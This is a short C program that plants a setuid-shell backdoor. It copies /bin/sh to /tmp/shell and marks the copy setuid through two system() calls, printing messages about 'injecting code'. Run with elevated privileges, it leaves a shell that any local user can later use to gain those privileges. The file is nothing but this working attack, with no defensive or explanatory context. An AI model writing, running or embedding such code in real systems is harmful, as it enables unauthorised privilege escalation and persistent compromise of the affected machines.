#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define CMD1 "cp /bin/sh /tmp/shell"
#define CMD2 "chmod +s /tmp/shell"

void inject_code()
{
	system(CMD1);
	system(CMD2);
}

int main()
{
	printf("Injecting code...\n");
	inject_code();
	printf("Code injected successfully!\n");
	return 0;
}
